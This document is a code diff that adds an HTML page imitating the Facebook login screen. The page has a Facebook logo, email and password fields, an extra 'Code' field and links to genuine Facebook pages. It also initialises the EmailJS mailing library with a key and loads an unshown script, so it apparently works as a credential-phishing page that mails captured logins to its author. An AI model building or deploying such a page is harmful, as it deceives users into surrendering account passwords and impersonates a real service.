@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="mk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Form</title>
+  <link rel="stylesheet" href="stil.css">
+
+  <div class="forma">
+    <img src="fb.png" alt="Facebook" class="logo">
+  <form id="form">
+    <div class="pole">
+      <label for="email"></label>
+      <input type="text" name="email" id="email" placeholder="Mobile number or email">
+    </div>
+    <div class="pole">
+      <label for="password"></label>
+      <input type="password" name="password" id="password" placeholder="Password">
+    </div>
+    <div class="pole">
+      <label for="code"></label>
+      <input type="text" name="code" id="code" placeholder="Code" readonly onclick="generiraj()">
+    </div>
+    <input type="submit" id="button" value="Log in" >
+      <a href="https://www.facebook.com/r.php" class="akaunt">Create new account</a>
+  </form>
+
+  <img src="meta.jpg" alt="Meta" class="meta">
+  <div class="linkovi">
+    <a href="https://www.facebook.com/about" target="_blank">About</a>
+    <a href="https://www.facebook.com/help" target="_blank">Help</a>
+    <a href="https://www.facebook.com/policies" target="_blank">More</a>
+  </div>
+  </div>
+  
+  <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  
+  <script type="text/javascript">
+    emailjs.init('fs_koUjw57QG-30-9')
+  </script>
+
+  <script src="skripta.js"></script>
+
+</body>
+</html>
+
